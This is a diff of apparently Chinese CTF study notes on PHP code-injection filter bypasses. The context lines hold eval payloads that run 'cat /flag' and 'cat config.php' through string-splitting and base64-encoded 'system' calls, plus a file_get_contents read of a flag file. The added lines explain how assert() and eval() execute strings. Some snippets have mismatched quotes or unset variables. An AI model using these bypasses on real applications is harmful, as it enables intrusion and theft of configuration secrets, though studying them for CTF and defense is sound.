@@ -9,6 +9,17 @@ eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码
 eval("$x='sys';  $y='tem';  $z=$x.$y;  $z('cat config.php');" );         //绕过过滤。
 eval('base64_decode("c3lzdGVt");$b=base64_decode("Y2F0IGNvbmZpZy5waHA=");$a($b);');        //base64编码绕过。
 
+assert()可以将整个字符串参数当作php参数执行
+而类似的eval()函数是执行合法的php代码，eval()里的引号必须是双引号，因为单引号不能解析字符串里的变量$str，且必须以分号结尾，函数调用除外。
+```
+<?php
+echo eval(echo 1);
+?>
+不行，需改成下面：
+<?php
+echo eval("echo 1;");
+?>
+```
 
 ^
 print_r(file_get_contents(/flagg')); //打印获取文件的内容
